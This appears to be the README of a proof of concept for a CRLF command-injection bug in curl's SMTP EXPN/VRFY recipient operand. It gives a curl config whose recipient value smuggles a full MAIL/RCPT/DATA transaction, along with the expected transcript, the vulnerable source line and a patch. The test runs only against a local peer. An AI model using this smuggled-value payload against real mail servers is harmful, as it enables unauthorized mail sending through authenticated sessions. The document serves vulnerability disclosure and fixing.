# curl SMTP EXPN recipient CRLF command injection

This proof of concept demonstrates stock curl sending extra SMTP commands from the `CURLOPT_MAIL_RCPT` operand used with an SMTP `EXPN` request.

The runner starts a local SMTP peer, writes a curl config file, invokes stock `curl` with `curl -K`, and records the wire transcript. The configured operation is a single authenticated `EXPN Friends` request. The recipient operand contains CRLF separators followed by a full SMTP transaction:

```text
MAIL FROM:<probe-sender@example.com>
RCPT TO:<probe-recipient@example.com>
DATA
Subject: injected

curl-smtp-injection-marker-v1
.
```

curl authenticates with `AUTH PLAIN`, sends the `EXPN` line, then sends the injected transaction under the same authenticated SMTP session. The local SMTP peer records a completed message and the runner writes `VULNERABILITY_CONFIRMED.marker`.

## Demonstrated Flow

The generated curl config has this shape:

```text
url = "smtp://127.0.0.1:<port>/probe"
request = "EXPN"
mail-rcpt = "Friends\r\nMAIL FROM:<probe-sender@example.com>\r\nRCPT TO:<probe-recipient@example.com>\r\nDATA\r\nSubject: injected\r\n\r\ncurl-smtp-injection-marker-v1\r\n."
user = "alice:secret"
login-options = "AUTH=PLAIN"
verbose
max-time = "10"
```

The expected SMTP transcript is:

```text
EHLO probe
AUTH PLAIN
AGFsaWNlAHNlY3JldA==
EXPN Friends
MAIL FROM:<probe-sender@example.com>
RCPT TO:<probe-recipient@example.com>
DATA
Subject: injected

curl-smtp-injection-marker-v1
.
```

The marker body accepted by the SMTP peer is:

```text
Subject: injected

curl-smtp-injection-marker-v1
```

## Requirements

Run with:

```text
Python 3
curl with SMTP support
```

Use the system curl:

```bash
python run_demo.py
```

Use a specific curl binary:

```bash
python run_demo.py --curl /path/to/curl
```

## Quick Run

From this directory:

```bash
python run_demo.py
```

Expected terminal evidence:

```text
curl_exit=0
auth_seen=true
custom_request_seen=true
injected_mail_seen=true
injected_rcpt_seen=true
injected_data_seen=true
message_completed=true
marker_in_message=true
confirmed=true
marker_file=<work-dir>/VULNERABILITY_CONFIRMED.marker
evidence_json=<work-dir>/logs/evidence.json
```

The marker file contains:

```text
confirmed=true
command_injected=true
message_completed=true
recipient=<probe-recipient@example.com>
marker=curl-smtp-injection-marker-v1
```

## Custom Work Directory

By default, the runner writes generated files under:

```text
run/stock-curl-smtp-expn
```

To choose another location:

```bash
python run_demo.py --work-dir /tmp/curl-smtp-expn-poc
```

To choose another port:

```bash
python run_demo.py --port 2525
```

To exercise the same recipient path with an explicit `VRFY` custom request:

```bash
python run_demo.py --mode vrfy
```

## Generated Files

The runner writes:

```text
smtp-crlf-injection.curlrc
logs/evidence.json
VULNERABILITY_CONFIRMED.marker
```

The repository folder contains only the source files required to reproduce the proof.

## Evidence Meaning

`auth_seen=true` means curl authenticated to the SMTP peer before the injected commands were observed.

`custom_request_seen=true` means the configured custom recipient command reached the SMTP peer as `EXPN Friends` or `VRFY Friends`.

`injected_mail_seen=true`, `injected_rcpt_seen=true`, and `injected_data_seen=true` mean CRLF in the recipient operand created extra SMTP command lines.

`message_completed=true` means the local SMTP peer entered `DATA` mode and received a dot-terminated message.

`marker_in_message=true` means the accepted message body contained:

```text
curl-smtp-injection-marker-v1
```

`logs/evidence.json` contains the curl config, curl stdout and stderr, parsed command transcript, peer events, and all boolean checks.

## Source Path

The relevant curl SMTP command construction is the custom recipient branch in `lib/smtp.c`:

```c
result = Curl_pp_sendf(data, &smtpc->pp,
                       "%s %s%s", smtp->custom,
                       smtp->rcpt->data,
                       utf8 ? " SMTPUTF8" : "");
```

The custom request string is control-byte checked before use. The recipient operand in this branch is written directly into the SMTP command line.

## Patch Direction

Reject CR and LF in the custom SMTP recipient operand before serializing it into the protocol line:

```c
if(strpbrk(smtp->rcpt->data, "\r\n")) {
  failf(data, "Refusing to send SMTP command operand with a CR or LF");
  return CURLE_BAD_FUNCTION_ARGUMENT;
}
```

## Cleanup

Remove the generated work directory:

```bash
rm -rf run/stock-curl-smtp-expn
```
